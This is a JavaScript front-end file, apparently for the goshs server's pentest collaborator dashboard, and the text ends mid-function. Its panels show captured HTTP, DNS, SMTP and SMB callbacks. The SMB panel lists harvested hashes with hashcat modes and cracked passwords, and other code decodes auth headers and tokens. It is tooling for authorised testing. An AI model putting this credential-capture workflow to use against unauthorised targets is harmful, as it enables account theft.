const ST = {
  sortCol: "name",
  sortAsc: true,
  dnsEvents: [],
  smtpEvents: [],
  smbEvents: [],
  httpEvents: [],
  dnsCnt: { total: 0, A: 0, MX: 0, TXT: 0, other: 0 },
  httpCnt: 0,
  pendingUploads: [],
  shareTarget: "",
  ws: null,
  theme: localStorage.getItem("goshs-theme") || "dark",
};

// ── init ──
document.addEventListener("DOMContentLoaded", () => {
  const activeTab = sessionStorage.getItem("activeTab");
  if (activeTab) {
    sessionStorage.removeItem("activeTab");
    const btn = document.getElementById(activeTab);
    if (btn) btn.click();
  }
  applyTheme(ST.theme);
  initDrop();
  initCliHistory();
  connectWS();
  initContextMenu();
  initSharedLinks();
  if (typeof initCatcher === "function") initCatcher();
});

// ══ THEME ══
function toggleTheme() {
  ST.theme = ST.theme === "dark" ? "light" : "dark";
  localStorage.setItem("goshs-theme", ST.theme);
  applyTheme(ST.theme);
}
function applyTheme(t) {
  document.documentElement.setAttribute("data-theme", t);
  const logo = document.getElementById("goshs-logo");
  if (logo) {
    if (t === "light") {
      logo.src = "/images/logo-light.png?static";
    } else {
      logo.src = "/images/logo-dark.png?static";
    }
  }
}

// ══ EMBEDDED FILES ══
function filterEmbedded() {
  const q = document.getElementById("emb-search").value.toLowerCase();
  document.querySelectorAll("#emb-tbody tr[data-name]").forEach((tr) => {
    const name = (tr.dataset.name || "").toLowerCase();
    tr.style.display = !q || name.includes(q) ? "" : "none";
  });
}

const embSortDir = { name: true, size: true, mtime: true };
function sortEmbedded(col) {
  const asc = (embSortDir[col] = !embSortDir[col]);
  const tbody = document.getElementById("emb-tbody");
  const rows = Array.from(tbody.querySelectorAll("tr[data-name]"));

  rows.sort((a, b) => {
    let va = a.dataset[col] || "",
      vb = b.dataset[col] || "";
    if (col === "size" || col === "mtime") {
      va = parseFloat(va) || 0;
      vb = parseFloat(vb) || 0;
      return asc ? va - vb : vb - va;
    }
    return asc ? va.localeCompare(vb) : vb.localeCompare(va);
  });

  rows.forEach((r) => tbody.appendChild(r));

  // Update sort indicators
  document.querySelectorAll("#emb-table th[id]").forEach((th) => {
    th.classList.remove("sorted");
    th.querySelector(".sort-arrow").textContent = "↕";
  });
  const th = document.getElementById("emb-th-" + col);
  if (th) {
    th.classList.add("sorted");
    th.querySelector(".sort-arrow").textContent = asc ? "↑" : "↓";
  }
}

function copyEmbLink(name) {
  const url =
    location.origin +
    encodeURIComponent(name).replace("%2F", "/") +
    "?embedded";
  navigator.clipboard
    .writeText(url)
    .then(() => toast("Link copied!", "success"))
    .catch(() => toast("Copy failed", "error"));
}

// ══ PANEL / TAB SWITCHING ══
function switchPanel(name, el) {
  document
    .querySelectorAll(".snav")
    .forEach((b) => b.classList.remove("active"));
  document
    .querySelectorAll(".panel")
    .forEach((p) => p.classList.remove("active"));
  el.classList.add("active");
  const p = document.getElementById("panel-" + name);
  if (p) p.classList.add("active");
}
function switchCollab(name, el) {
  document
    .querySelectorAll(".ctab")
    .forEach((t) => t.classList.remove("active"));
  document
    .querySelectorAll(".cpanel")
    .forEach((p) => p.classList.remove("active"));
  el.classList.add("active");
  const p = document.getElementById("cpanel-" + name);
  if (p) p.classList.add("active");
}

// ══ WEBSOCKET ══
function connectWS() {
  const proto = location.protocol === "https:" ? "wss" : "ws";
  ST.ws = new WebSocket(`${proto}://${window.location.host}/?ws`);
  ST.ws.onopen = () => {
    document.getElementById("ws-status").style.color = "var(--accent)";
    document.getElementById("collab-status").textContent = "connected";
    console.log("Websocket connected");
  };
  ST.ws.onclose = () => {
    document.getElementById("ws-status").style.color = "var(--danger)";
    document.getElementById("collab-status").textContent = "reconnecting…";
    setTimeout(connectWS, 2500);
    console.log("WebSocket closed");
  };
  ST.ws.onmessage = (e) => {
    let msg;
    try {
      msg = JSON.parse(e.data);
    } catch {
      return;
    }
    if (msg.type === "dns") onDNS(msg);
    else if (msg.type === "smtp") onSMTP(msg);
    else if (msg.type === "http") onHTTP(msg);
    else if (msg.type === "smb") onSMB(msg);
    else if (msg.type === "refreshClipboard") onClipboardUpdate(msg);
    else if (msg.type === "reload") location.reload();
    else if (msg.type === "catchup") onCatchup(msg);
    else if (msg.type === "updateCLI") cliOutput(msg);
    else if (msg.type === "catcherConnection") onCatcherConnection(msg);
  };
}

function onCatchup(msg) {
  // ── HTTP ──
  const http = msg.http || [];
  if (http.length) {
    // unshift in reverse so newest ends up at index 0
    for (let i = http.length - 1; i >= 0; i--) {
      ST.httpEvents.push(http[i]);
    }
    ST.httpCnt = ST.httpEvents.length;
    document.getElementById("http-badge").textContent = ST.httpCnt;
  }

  // ── DNS ──
  const dns = msg.dns || [];
  if (dns.length) {
    for (let i = dns.length - 1; i >= 0; i--) {
      const e = dns[i];
      ST.dnsEvents.push(e);
      ST.dnsCnt.total++;
      if (e.qtype === "A") ST.dnsCnt.A++;
      else if (e.qtype === "MX") ST.dnsCnt.MX++;
      else if (e.qtype === "TXT") ST.dnsCnt.TXT++;
      else ST.dnsCnt.other++;
    }
    document.getElementById("dns-badge").textContent = ST.dnsEvents.length;
    document.getElementById("dns-cnt-total").textContent = ST.dnsCnt.total;
    document.getElementById("dns-cnt-a").textContent = ST.dnsCnt.A;
    document.getElementById("dns-cnt-mx").textContent = ST.dnsCnt.MX;
    document.getElementById("dns-cnt-txt").textContent = ST.dnsCnt.TXT;
    document.getElementById("dns-cnt-other").textContent = ST.dnsCnt.other;
  }

  // ── SMTP ──
  const smtp = msg.smtp || [];
  if (smtp.length) {
    for (let i = smtp.length - 1; i >= 0; i--) {
      ST.smtpEvents.push(smtp[i]);
    }
    document.getElementById("smtp-badge").textContent = ST.smtpEvents.length;
  }

  const smb = msg.smb || [];
  if (smb.length) {
    for (let i = smb.length - 1; i >= 0; i--) {
      ST.smbEvents.push(smb[i]);
    }
    document.getElementById("smb-badge").textContent = ST.smbEvents.length;
  }

  // ── Update the combined collab badge ──
  const total =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  if (total > 0) {
    const badge = document.getElementById("collab-badge");
    badge.classList.add("show");
    badge.textContent = total;
  }

  // ── Render everything once ──
  if (http.length) renderHTTP();
  if (dns.length) renderDNS();
  if (smtp.length) renderSMTP();
  if (smb.length) renderSMB();
}

// ══ HTTP LOG ══
function onHTTP(e) {
  ST.httpEvents.unshift(e);
  ST.httpCnt++;
  document.getElementById("http-badge").textContent = ST.httpCnt;
  const badge = document.getElementById("collab-badge");
  badge.classList.add("show");
  badge.textContent =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  renderHTTP();
}

function methodClass(m) {
  const map = {
    GET: "m-get",
    POST: "m-post",
    PUT: "m-put",
    DELETE: "m-delete",
  };
  return map[(m || "").toUpperCase()] || "m-other";
}
function statusClass(s) {
  if (s >= 200 && s < 300) return "s2xx";
  if (s >= 300 && s < 400) return "s3xx";
  if (s >= 400 && s < 500) return "s4xx";
  if (s >= 500) return "s5xx";
  return "";
}

function renderHTTP() {
  const filter = (
    document.getElementById("http-search").value || ""
  ).toLowerCase();
  const tbody = document.getElementById("http-tbody");
  const empty = document.getElementById("http-empty-row");

  const vis = ST.httpEvents.filter(
    (e) =>
      !filter ||
      (e.url || "").toLowerCase().includes(filter) ||
      (e.method || "").toLowerCase().includes(filter) ||
      (e.source || "").toLowerCase().includes(filter) ||
      (e.useragent || "").toLowerCase().includes(filter) ||
      String(e.status || "").includes(filter),
  );

  empty.style.display = vis.length ? "none" : "";
  tbody
    .querySelectorAll("tr.data-row, tr.http-detail-row")
    .forEach((r) => r.remove());

  vis.slice(0, 500).forEach((e, i) => {
    const ts = e.timestamp ? new Date(e.timestamp).toLocaleTimeString() : "";
    const hasBody = e.body && e.body.trim().length > 0;
    const hasParams = e.parameters && e.parameters.trim().length > 0;
    const detailId = "http-detail-" + i;
    //
    // detect & decode params
    const paramDisplay = hasParams
      ? (() => {
          const decoded = decodeParams(e.parameters);
          // check if any decoding happened
          const hasDecoded = e.parameters !== decoded;
          return { text: decoded, decoded: hasDecoded };
        })()
      : null;

    // detect & decode body
    const bodyDisplay = hasBody ? smartDecode(e.body) : null;

    // ── main row ──
    const tr = document.createElement("tr");
    tr.className = "data-row" + (i === 0 && !filter ? " new-row" : "");
    tr.innerHTML = `
      <td class="http-ts">${esc(ts)}</td>
      <td><span class="http-method ${methodClass(e.method)}">${esc(e.method || "?")}</span></td>
      <td><span class="status-code ${statusClass(e.status)}">${esc(String(e.status || "?"))}</span></td>
      <td class="http-path" style="max-width:320px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(e.url || "")}">${esc(e.url || "")}</td>
      <td class="http-ip">${esc(e.source || "")}</td>
      <td><button class="http-expand-btn" onclick="toggleHTTPDetail(this, '${detailId}')" title="Details">▾</button></td>`;

    tbody.insertBefore(tr, empty.nextSibling || null);
    tbody.appendChild(tr);

    // ── detail row (hidden by default) ──
    const dr = document.createElement("tr");
    dr.className = "http-detail-row";
    dr.id = detailId;
    dr.style.display = "none";
    dr.innerHTML = `<td colspan="6">
      <div class="http-detail-inner">
        <div class="http-detail-field full">
          <span class="http-detail-label">Full URL</span>
          <div class="http-detail-value">${esc(e.url || "—")}</div>
        </div>
        ${
          paramDisplay
            ? `
        <div class="http-detail-field full">
          <span class="http-detail-label">
            Query parameters
            ${paramDisplay.decoded ? '<span class="decode-tag">decoded</span>' : ""}
          </span>
          <div class="http-detail-value">${esc(paramDisplay.text)}</div>
        </div>`
            : ""
        }
        <div class="http-detail-field">
          <span class="http-detail-label">Source IP</span>
          <div class="http-detail-value">${esc(e.source || "—")}</div>
        </div>
        <div class="http-detail-field">
          <span class="http-detail-label">Status</span>
          <div class="http-detail-value">${esc(String(e.status || "—"))}</div>
        </div>
        <div class="http-detail-field full">
          <span class="http-detail-label">Headers</span>
          <div class="http-detail-value">${esc(fmtHeaders(e.headers))}</div>
        </div>
        ${
          bodyDisplay
            ? `
        <div class="http-detail-field full">
          <span class="http-detail-label">
            Request body
            ${bodyDisplay.tag ? `<span class="decode-tag">${esc(bodyDisplay.tag)}</span>` : ""}
          </span>
          <div class="http-detail-value">${esc(bodyDisplay.text)}</div>
        </div>`
            : ""
        }
        <div class="http-detail-field full">
          <span class="http-detail-label">Timestamp</span>
          <div class="http-detail-value">${esc(e.timestamp ? new Date(e.timestamp).toLocaleString() : "—")}</div>
        </div>
      </div>
    </td>`;
    tbody.appendChild(dr);
  });
}

function toggleHTTPDetail(btn, id) {
  const row = document.getElementById(id);
  if (!row) return;
  const open = row.style.display !== "none";
  row.style.display = open ? "none" : "";
  btn.textContent = open ? "▾" : "▴";
  btn.closest("tr").classList.toggle("expanded", !open);
}

// ══ SMART CONTENT DETECTION ══
function tryJSON(s) {
  if (!/^[\[{]/.test(s.trim())) return null;
  try {
    const parsed = JSON.parse(s);
    const walked = walkJSON(parsed);
    return JSON.stringify(walked, null, 2);
  } catch {
    return null;
  }
}

// Recursively walk a parsed JSON value and attempt to decode any string leaves
function walkJSON(node) {
  if (Array.isArray(node)) {
    return node.map(walkJSON);
  }
  if (node !== null && typeof node === "object") {
    const out = {};
    for (const [k, v] of Object.entries(node)) {
      out[k] = walkJSON(v);
    }
    return out;
  }
  if (typeof node === "string") {
    return decodeStringLeaf(node);
  }
  return node;
}

// Try to decode a single string value — returns either the original string
// or an object like { __decoded: "base64", __value: <decoded> } so the
// caller can see both the tag and the result in the pretty-printed output
function decodeStringLeaf(s) {
  if (!s || s.length < 8) return s;

  // JWT first
  const jwt = tryJWT(s);
  if (jwt) {
    try {
      return { __decoded: "JWT", __value: JSON.parse(jwt) };
    } catch {
      return { __decoded: "JWT", __value: jwt };
    }
  }

  // Base64
  const b64 = tryBase64(s);
  if (b64) {
    // Decoded value might itself be JSON
    const nested = (() => {
      try {
        if (!/^[\[{]/.test(b64.trim())) return null;
        return JSON.parse(b64);
      } catch {
        return null;
      }
    })();
    if (nested) return { __decoded: "base64→JSON", __value: walkJSON(nested) };
    return { __decoded: "base64", __value: b64 };
  }

  return s;
}

function tryBase64(s) {
  if (!s || s.length < 8) return null;
  // Strip any whitespace/newlines that might wrap multiline base64
  const clean = s.replace(/[\r\n\s]/g, "");
  // Two separate checks — standard (+/) and URL-safe (-_)
  const isStd = /^[A-Za-z0-9+/]+=*$/.test(clean);
  const isUrlSafe = /^[A-Za-z0-9\-_]+=*$/.test(clean);
  if (!isStd && !isUrlSafe) return null;
  // Normalize URL-safe to standard then fix padding
  const norm = clean.replace(/-/g, "+").replace(/_/g, "/");
  const rem = norm.length % 4;
  const padded = rem === 0 ? norm : norm + "=".repeat(4 - rem);
  try {
    const decoded = atob(padded);
    // Reject binary blobs — more than 10% non-printable = not useful text
    let bad = 0;
    for (let i = 0; i < decoded.length; i++) {
      const c = decoded.charCodeAt(i);
      if (c < 9 || (c > 13 && c < 32) || c === 127) bad++;
    }
    if (decoded.length > 0 && bad / decoded.length > 0.1) return null;
    return decoded;
  } catch {
    return null;
  }
}

function tryDecodeValue(raw) {
  // JSON first — walkJSON handles nested b64/JWT inside
  const json = tryJSON(raw);
  if (json) return { text: json, tag: "JSON" };

  // JWT before generic base64
  const jwt = tryJWT(raw);
  if (jwt) return { text: jwt, tag: "JWT" };

  // Generic base64
  const b64 = tryBase64(raw);
  if (b64) {
    const nested = tryJSON(b64); // tryJSON will also walk any nested b64
    if (nested) return { text: nested, tag: "base64 → JSON" };
    return { text: b64, tag: "base64" };
  }
  return null;
}

function smartDecode(raw) {
  if (!raw || !raw.trim()) return { text: raw, tag: null };
  const trimmed = raw.trim();

  // Try decoding the whole value first
  const direct = tryDecodeValue(trimmed);
  if (direct) return direct;

  // Try form-encoded: key=value&key=value
  // Each value is decoded independently
  if (
    trimmed.includes("=") &&
    !trimmed.startsWith("{") &&
    !trimmed.startsWith("[")
  ) {
    const lines = trimmed.split("&").map((pair) => {
      const eq = pair.indexOf("=");
      if (eq === -1) return decodeURIComponent(pair);
      const k = decodeURIComponent(pair.slice(0, eq));
      const v = decodeURIComponent(pair.slice(eq + 1));
      const dec = tryDecodeValue(v);
      if (dec)
        return `${k} [${dec.tag}] = ${
          dec.text.includes("\n")
            ? "\n" +
              dec.text
                .split("\n")
                .map((l) => "  " + l)
                .join("\n")
            : dec.text
        }`;
      return `${k} = ${v}`;
    });
    const result = lines.join("\n\n");
    // Only label as decoded if at least one value was transformed
    const anyDecoded = trimmed.split("&").some((pair) => {
      const eq = pair.indexOf("=");
      if (eq === -1) return false;
      return tryDecodeValue(decodeURIComponent(pair.slice(eq + 1))) !== null;
    });
    return { text: result, tag: anyDecoded ? "form-decoded" : null };
  }

  return { text: raw, tag: null };
}

function decodeParams(paramStr) {
  if (!paramStr) return "";
  try {
    return paramStr
      .split("&")
      .map((p) => {
        const eq = p.indexOf("=");
        if (eq === -1) return decodeURIComponent(p);
        const k = decodeURIComponent(p.slice(0, eq));
        const raw = decodeURIComponent(p.slice(eq + 1));
        const dec = tryDecodeValue(raw);
        if (!dec) return `${k} = ${raw}`;
        const tagStr = ` [${dec.tag}]`;
        const valStr = dec.text.includes("\n")
          ? "\n" +
            dec.text
              .split("\n")
              .map((l) => "  " + l)
              .join("\n")
          : dec.text;
        return `${k}${tagStr} = ${valStr}`;
      })
      .join("\n\n");
  } catch {
    return paramStr;
  }
}

function tryJWT(s) {
  const parts = s.replace(/^Bearer\s+/i, "").split(".");
  if (parts.length !== 3) return null;
  try {
    const header = JSON.parse(
      atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")),
    );
    const payload = JSON.parse(
      atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")),
    );
    return JSON.stringify({ header, payload, signature: parts[2] }, null, 2);
  } catch {
    return null;
  }
}

function decodeAuthHeader(value) {
  const v = (value || "").trim();

  // JWT / Bearer
  if (/^Bearer\s+/i.test(v)) {
    const jwt = tryJWT(v);
    if (jwt) return { text: jwt, tag: "JWT" };
    // Bearer but not JWT — decode the token part as plain base64
    const token = v.replace(/^Bearer\s+/i, "");
    const b64 = tryBase64(token);
    if (b64) return { text: b64, tag: "Bearer → base64" };
    return { text: v, tag: null };
  }

  // Basic auth — "Basic <base64(user:pass)>"
  if (/^Basic\s+/i.test(v)) {
    const token = v.replace(/^Basic\s+/i, "");
    const b64 = tryBase64(token);
    if (b64) return { text: b64, tag: "Basic auth" };
    return { text: v, tag: null };
  }

  // Digest, NTLM, Negotiate, AWS4-HMAC-SHA256 etc — label the scheme at minimum
  const schemeMatch = v.match(/^([A-Za-z0-9\-]+)\s+(.+)$/);
  if (schemeMatch) {
    const scheme = schemeMatch[1];
    const token = schemeMatch[2];
    const b64 = tryBase64(token);
    if (b64) return { text: b64, tag: `${scheme} → base64` };
    // Try treating it as comma-separated key=value (Digest/AWS style)
    if (token.includes(",")) {
      const pretty = token
        .split(",")
        .map((p) => "  " + p.trim())
        .join("\n");
      return { text: pretty, tag: scheme };
    }
    return { text: v, tag: null };
  }

  // Plain value with no scheme — try generic base64
  const b64 = tryBase64(v);
  if (b64) return { text: b64, tag: "base64" };

  return { text: v, tag: null };
}

function fmtHeaders(headers) {
  if (!headers || typeof headers !== "object") return "(none)";
  return Object.entries(headers)
    .sort(([a], [b]) => a.localeCompare(b))
    .map(([k, v]) => {
      // Authorization gets the full scheme-aware decoder
      if (k.toLowerCase() === "authorization") {
        const dec = decodeAuthHeader(v);
        if (dec.tag) {
          const indented = dec.text.includes("\n")
            ? "\n" +
              dec.text
                .split("\n")
                .map((l) => "    " + l)
                .join("\n")
            : dec.text;
          return `${k} [${dec.tag}]: ${indented}`;
        }
        return `${k}: ${v}`;
      }

      // Every other header — try generic decode
      const dec = tryDecodeValue(v);
      if (dec) {
        const indented = dec.text.includes("\n")
          ? "\n" +
            dec.text
              .split("\n")
              .map((l) => "    " + l)
              .join("\n")
          : dec.text;
        return `${k} [${dec.tag}]: ${indented}`;
      }

      return `${k}: ${v}`;
    })
    .join("\n");
}

function filterHTTP() {
  renderHTTP();
}

function clearHTTP() {
  ST.httpEvents = [];
  ST.httpCnt = 0;
  document.getElementById("http-badge").textContent = "0";
  ST.ws.send(JSON.stringify({ type: "clearHTTP" }));
  const badge = document.getElementById("collab-badge");
  badge.textContent =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  if (badge.textContent === "0") badge.classList.remove("show");
  renderHTTP();
}

// ══ DNS LOG ══
function onDNS(e) {
  ST.dnsEvents.unshift(e);
  ST.dnsCnt.total++;
  if (e.qtype === "A") ST.dnsCnt.A++;
  else if (e.qtype === "MX") ST.dnsCnt.MX++;
  else if (e.qtype === "TXT") ST.dnsCnt.TXT++;
  else ST.dnsCnt.other++;
  document.getElementById("dns-badge").textContent = ST.dnsEvents.length;
  document.getElementById("dns-cnt-total").textContent = ST.dnsCnt.total;
  document.getElementById("dns-cnt-a").textContent = ST.dnsCnt.A;
  document.getElementById("dns-cnt-mx").textContent = ST.dnsCnt.MX;
  document.getElementById("dns-cnt-txt").textContent = ST.dnsCnt.TXT;
  document.getElementById("dns-cnt-other").textContent = ST.dnsCnt.other;
  const badge = document.getElementById("collab-badge");
  badge.classList.add("show");
  badge.textContent =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  renderDNS();
}
function qtypeClass(t) {
  const map = {
    A: "qt-A",
    AAAA: "qt-AAAA",
    MX: "qt-MX",
    TXT: "qt-TXT",
    NS: "qt-NS",
    CNAME: "qt-CNAME",
  };
  return map[t] || "qt-other";
}
function fmtQName(name) {
  const clean = (name || "").replace(/\.$/, "");
  const parts = clean.split(".");
  if (parts.length <= 2) return `<span class="qname">${esc(clean)}</span>`;
  const host = esc(parts.slice(0, -2).join("."));
  const tld = esc(parts.slice(-2).join("."));
  return `<span class="qname">${host}.<span class="qname-tld">${tld}</span></span>`;
}
function renderDNS() {
  const filter = (
    document.getElementById("dns-search").value || ""
  ).toLowerCase();
  const tbody = document.getElementById("dns-tbody");
  const empty = document.getElementById("dns-empty-row");
  const vis = ST.dnsEvents.filter(
    (e) =>
      !filter ||
      (e.name || "").toLowerCase().includes(filter) ||
      (e.qtype || "").toLowerCase().includes(filter) ||
      (e.source || "").toLowerCase().includes(filter),
  );
  empty.style.display = vis.length ? "none" : "";
  tbody.querySelectorAll("tr.data-row").forEach((r) => r.remove());
  vis.slice(0, 500).forEach((e, i) => {
    const tr = document.createElement("tr");
    tr.className = "data-row" + (i === 0 && !filter ? " new-row" : "");
    tr.innerHTML = `
<td class="dns-ts">${e.timestamp ? new Date(e.timestamp).toLocaleTimeString() : ""}</td>
<td><span class="qtype-tag ${qtypeClass(e.qtype || "")}">${esc(e.qtype || "?")}</span></td>
<td>${fmtQName(e.name)}</td>
<td class="dns-source">${esc(e.source || "")}</td>`;
    tbody.insertBefore(tr, empty.nextSibling || null);
    tbody.appendChild(tr);
  });
}
function clearDNS() {
  ST.dnsEvents = [];
  ST.dnsCnt = { total: 0, A: 0, MX: 0, TXT: 0, other: 0 };
  ["total", "a", "mx", "txt", "other"].forEach((k) => {
    const el = document.getElementById("dns-cnt-" + k);
    if (el) el.textContent = "0";
  });
  document.getElementById("dns-badge").textContent = "0";
  ST.ws.send(JSON.stringify({ type: "clearDNS" }));
  const badge = document.getElementById("collab-badge");
  badge.textContent =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  if (badge.textContent === "0") badge.classList.remove("show");
  renderDNS();
}

// == SMB Log ==
function onSMB(e) {
  console.log(e);
  ST.smbEvents.unshift(e);
  document.getElementById("smb-badge").textContent = ST.smbEvents.length;
  const badge = document.getElementById("collab-badge");
  badge.classList.add("show");
  badge.textContent =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  renderSMB();
}

function renderSMB() {
  const filter = (
    document.getElementById("smb-search").value || ""
  ).toLowerCase();

  const inbox = document.getElementById("smb-inbox");
  const empty = document.getElementById("smb-empty");

  const vis = ST.smbEvents.filter(
    (e) =>
      !filter ||
      (e.username || "").toLowerCase().includes(filter) ||
      (e.domain || "").toLowerCase().includes(filter) ||
      (e.source || "").toLowerCase().includes(filter) ||
      (e.hash || "").toLowerCase().includes(filter),
  );

  empty.style.display = vis.length ? "none" : "flex";
  inbox.querySelectorAll(".smb-card").forEach((c) => c.remove());

  vis.slice(0, 500).forEach((e, i) => {
    const card = document.createElement("div");
    const isNew = i === 0 && !filter;
    card.className =
      "smb-card" +
      (isNew ? " new-card" : "") +
      (e.crackedPassword ? " cracked-card" : "");

    const ts = e.timestamp ? new Date(e.timestamp).toLocaleTimeString() : "";
    const userSummary =
      [e.username, e.domain].filter(Boolean).join("@") || "unknown";
    const hashId = "smb-hash-" + Math.random().toString(36).slice(2);

    // ── Header (always visible, clickable) ──
    const header = document.createElement("div");
    header.className = "smb-card-header";
    header.innerHTML = `
       <span class="smb-badge-type">${esc(e.hashType || "—")}</span>
       ${e.crackedPassword ? `<span class="smb-badge-cracked">cracked</span>` : ""}
       <div class="smb-header-meta">
         <span class="smb-user-summary">${esc(userSummary)}</span>
         <span class="smb-source">${esc(e.source || "—")}</span>
       </div>
       <span class="smb-time">${esc(ts)}</span>
       <span class="smb-chevron">▾</span>
     `;

    // ── Body (collapsible) ──
    const body = document.createElement("div");
    body.className = "smb-card-body";
    body.innerHTML = `
       <div class="smb-meta-grid">
         <span class="smb-label">User</span>
         <span class="smb-val">${esc(e.username || "—")}</span>
         <span class="smb-label">Domain</span>
         <span class="smb-val">${esc(e.domain || "—")}</span>
         <span class="smb-label">Workstation</span>
         <span class="smb-val">${esc(e.workstation || "—")}</span>
         <span class="smb-label">Source</span>
         <span class="smb-val smb-mono">${esc(e.source || "—")}</span>
         <span class="smb-label">Hash Type</span>
         <span class="smb-val">${esc(e.hashType || "—")}</span>
         <span class="smb-label">Hashcat Mode</span>
         <span class="smb-val">hashcat -m ${esc(e.hashcatMode || "—")}</span>
         ${
           e.crackedPassword
             ? `
         <span class="smb-label smb-label-cracked">Cracked</span>
         <span class="smb-val smb-val-cracked smb-mono">${esc(e.crackedPassword)}</span>`
             : ""
         }
       </div>
       ${
         e.hash
           ? `
       <div class="smb-hash-wrap">
         <div class="smb-hash-label">Hashcat line</div>
         <div class="smb-hash-box">
           <code id="${hashId}">${esc(e.hash)}</code>
           <button class="btn btn-sm smb-copy-btn" title="Copy hash">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="13" height="13">
               <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
               <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
             </svg>
           </button>
         </div>
       </div>`
           : ""
       }
     `;

    // Wire up copy button after innerHTML is set
    const copyBtn = body.querySelector(".smb-copy-btn");
    if (copyBtn) {
      copyBtn.onclick = (ev) => {
        ev.stopPropagation();
        const text = document.getElementById(hashId)?.textContent || "";
        navigator.clipboard
          .writeText(text)
          .then(() => toast("Hash copied!", "ok"));
      };
    }

    // Toggle on header click
    header.onclick = () => card.classList.toggle("open");

    card.appendChild(header);
    card.appendChild(body);
    inbox.appendChild(card);
  });
}

function copyText(elementId) {
  const text = document.getElementById(elementId)?.textContent || "";
  navigator.clipboard.writeText(text).then(() => toast("Copied!", "ok"));
}

function clearSMB() {
  ST.smbEvents = [];
  document.getElementById("smb-badge").textContent = "0";
  ST.ws.send(JSON.stringify({ type: "clearSMB" }));
  const badge = document.getElementById("collab-badge");
  badge.textContent =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  if (badge.textContent === "0") badge.classList.remove("show");
  renderSMB();
}

// ══ SMTP ══
function onSMTP(e) {
  ST.smtpEvents.unshift(e);
  document.getElementById("smtp-badge").textContent = ST.smtpEvents.length;
  const badge = document.getElementById("collab-badge");
  badge.classList.add("show");
  badge.textContent =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  renderSMTP();
}
function attachIcon(contentType) {
  if (!contentType) return "";
  if (contentType.startsWith("image/"))
    return `<svg class="attach-icon img" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>`;
  if (contentType === "text/html")
    return `<svg class="attach-icon html" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>`;
  if (contentType === "application/pdf")
    return `<svg class="attach-icon pdf" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>`;
  if (
    contentType.includes("zip") ||
    contentType.includes("tar") ||
    contentType.includes("gz")
  )
    return `<svg class="attach-icon arch" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>`;
  return `<svg class="attach-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>`;
}
function buildMailCard(e, isNew) {
  const card = document.createElement("div");
  card.className = "mail-card" + (isNew ? " new-card" : "");

  const toStr = (e.to || []).join(", ") || "—";
  const ts = e.timestamp ? new Date(e.timestamp).toLocaleTimeString() : "";
  const init = (e.from || "?")[0].toUpperCase();
  const subj = e.subject || "(no subject)";
  const hasHTML = e.htmlBody && e.htmlBody.trim().length > 0;
  const hasText = e.body && e.body.trim().length > 0;
  const atts = e.attachments || [];
  const imgAtts = atts.filter(
    (a) => a.contentType && a.contentType.startsWith("image/"),
  );
  const hasImgs = imgAtts.length > 0;

  // Header
  const header = document.createElement("div");
  header.className = "mail-header";
  header.innerHTML = `
        <div class="mail-avatar">${esc(init)}</div>
        <div class="mail-meta">
          <div class="mail-from">${esc(e.from || "")}</div>
          <div class="mail-to">→ ${esc(toStr)}</div>
        </div>
        <div class="mail-time">${esc(ts)}</div>`;

  // Subject row
  const subjRow = document.createElement("div");
  subjRow.className = "mail-subject-row";
  subjRow.innerHTML = `
        <span>${esc(subj)}</span>
        ${atts.length ? `<span style="font-family:var(--mono);font-size:11px;color:var(--text2);margin-left:8px">📎 ${atts.length}</span>` : ""}
        <span class="mail-chevron">▾</span>`;

  // Body tabs (only if both exist)
  let bodyTabsEl = null;
  if (hasHTML && hasText) {
    bodyTabsEl = document.createElement("div");
    bodyTabsEl.className = "mail-body-tabs";
    bodyTabsEl.style.display = "none";
    bodyTabsEl.innerHTML = `
            <div class="mail-body-tab active" data-tab="plain">Plain text</div>
            <div class="mail-body-tab" data-tab="html">HTML</div>
            ${hasImgs ? `<div class="mail-body-tab" data-tab="preview">Preview</div>` : ""}`;
  }

  // Plain body
  const plainSection = document.createElement("div");
  plainSection.className = "mail-body-section";
  plainSection.style.display = "none";
  plainSection.dataset.pane = "plain";
  plainSection.innerHTML = `<pre>${esc(e.body || "(empty)")}</pre>`;

  // HTML render pane (sandboxed iframe)
  const htmlSection = document.createElement("div");
  htmlSection.className = "html-frame-wrap";
  htmlSection.style.display = "none";
  htmlSection.dataset.pane = "html";
  if (hasHTML) {
    const iframe = document.createElement("iframe");
    iframe.className = "html-frame";
    iframe.sandbox = "allow-same-origin"; // no scripts
    iframe.srcdoc = e.htmlBody;
